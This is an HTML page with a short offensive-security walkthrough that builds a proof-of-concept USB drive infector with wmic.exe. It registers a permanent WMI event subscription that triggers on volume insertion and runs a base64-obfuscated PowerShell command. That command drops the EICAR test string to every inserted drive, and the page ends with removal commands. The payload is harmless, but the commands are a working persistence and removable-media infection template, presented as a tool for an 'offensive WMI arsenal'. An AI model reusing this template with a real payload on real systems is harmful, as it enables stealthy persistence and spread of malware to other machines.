<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Example</title>
</head><body>In this example, we’re going to use wmic.exe to create a PoC USB drive infector that will immediately drop the EICAR string to eicar.txt in the root folder of any inserted removable media.<br/>
<br/>
#Change the event filter to use something other than &quot;USB Inserted&quot;<br/>
1) Create an __EventFilter instance.<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH <b>__EventFilter</b>CREATE Name=&quot;<b>VolumeArrival</b>&quot;, QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2&quot;<br/>
<br/>
#Actions that happen when Event occurs<br/>
2) Create an __EventConsumer instance. CommandLineEventConsumer in this example.<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH <b>CommandLineEventConsumer</b>CREATE Name=&quot;<b>InfectDrive</b>&quot;, CommandLineTemplate=&quot;powershell.exe -NoP -C [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=')) | Out-File %DriveName%\eicar.txt&quot;<br/>
<br/>
3) Obtain the __RELPATH of the __EventFilter and __EventConsumer instances. This built-in, system property provides the object instance syntax needed when creating a __FilterToConsumerBinding instance.<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH <b>__EventFilter</b>GET __RELPATH /FORMAT:list<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH <b>CommandLineEventConsumer</b>GET __RELPATH /FORMAT:list<br/>
<br/>
4) Create a __FilterToConsumerBinding instance. The syntax used for the Filter and Consumer properties came from the __RELPATH properties in the previous step.<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH <b>__FilterToConsumerBinding</b>CREATE Filter=&quot;__EventFilter.Name=\&quot;VolumeArrival\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;InfectDrive\&quot;&quot;<br/>
<br/>
At this point, the USB drive infector is registered and running!<br/>
<br/>
5) Optional: Remove all instances - i.e. unregister the permanent WMI event subscription.<br/>
<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter WHERE Name=&quot;VolumeArrival&quot; DELETE<br/>
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer WHERE Name=&quot;InfectDrive&quot; DELETE<br/>
<br/>
So that’s all there is to it! Hopefully, this will be a useful tool to add to your offensive WMI arsenal!</body></html>